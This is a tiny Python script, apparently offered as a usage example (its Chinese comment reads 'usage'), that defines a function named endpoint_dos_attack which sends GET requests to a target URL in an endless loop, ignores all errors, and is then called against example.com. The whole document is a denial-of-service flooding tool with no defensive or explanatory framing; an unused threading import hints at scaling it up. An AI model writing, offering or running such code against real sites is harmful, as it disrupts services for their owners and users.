import requests
import threading

def endpoint_dos_attack(target_url):
    while True:
        try:
            requests.get(target_url)
        except:
            pass

# 使用方法
endpoint_dos_attack('http://www.example.com')